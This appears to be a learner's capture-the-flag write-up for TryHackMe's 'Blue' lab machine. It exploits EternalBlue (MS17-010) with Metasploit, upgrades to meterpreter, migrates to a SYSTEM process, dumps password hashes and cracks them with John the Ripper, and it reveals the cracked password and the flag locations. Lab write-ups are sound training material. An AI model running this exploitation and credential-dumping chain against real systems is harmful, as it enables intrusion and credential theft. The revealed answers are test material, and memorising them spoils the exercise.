BLUE THM
10.10.110.93

we'll start with an nmap scan

nmap -A -T4 -p- -v --min-rate=1000 10.10.160.22
found a lot of open ports but important ones are
135
139
445
3389

lets enum this ports further

find vulnerable ports using scripts
nmap -sV -vv --script vuln 10.10.160.22
Found out it's vulnerable to
smb-vuln-ms17-010: 
VULNERABLE:
Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
State: VULNERABLE
IDs:  CVE:CVE-2017-0143
Risk factor: HIGH
A critical remote code execution vulnerability exists in Microsoft SMBv1
servers (ms17-010).
thi vuln is called EternalBlue which only affects microsoft systems which actually involves CVE-2017-0143 to 48, a family of critical vulnerabilities related to the Microsoft SMBv1 server protocol used in certain Windows versions. It allows an attacker to execute arbitrary code on a victim system by sending tailored messages to the SMBv1 server

let's find a way to exploit this

to exploit this machine?
open msfconsole
search ms17-010

found 3 exploits and 2 auxillary modules, we will be using one of the exploits
we choose exploit/windows/smb/ms17_010_eternalblue a our exploit to use

now lets check the payload info using the "show info" cmd

now "Show options" and set the one required value

we got a root shell after running our exploit on the target machine

now let's find a way to escalate priv
lets convert to meterpreter shell using
use post/multi/manage/shell_to_meterpreter
set required options
run
we should have a new session with meterpreter shell

now list sessions with session -l to find our new session
now select our new session with "sessions  SESSION_NUMBER"
Verify that we have escalated to NT AUTHORITY\SYSTEM. Run getsystem to confirm this
run "shell" to open a dos shell
background new sssion
open it a again
run ps and find a process that runs as SYSTEM at the bottom
write down pid
migrate to process using "migrate pid"
dump passw hashes using "hashdump" cmd
save password dump to a file.
now lets crack it
after wasting some time and a little research, finally found a way to crack the hash using john the ripper
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt /password_hash

found our passwd for user Jon to be alqfna22

lets find our flags
flag1 found at the root folder c\
flag2 found at the \config folder
flag3 found at the \documents folder of the admin user

rooted this box finally